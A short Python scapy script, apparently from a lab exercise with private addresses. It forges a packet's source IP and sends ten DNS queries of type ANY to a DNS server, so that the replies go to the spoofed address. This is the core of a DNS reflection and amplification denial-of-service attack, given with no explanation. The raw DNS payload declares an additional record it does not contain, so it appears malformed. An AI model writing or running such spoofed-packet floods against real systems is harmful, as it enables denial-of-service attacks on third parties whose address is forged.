from scapy.all import *
import time

A= "192.168.30.1"
B= "192.168.20.1"
E= "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01"

spoofed_packet = IP(src=A, dst=B) / UDP(sport=5353, dport=53) / E
send(spoofed_packet, count=10)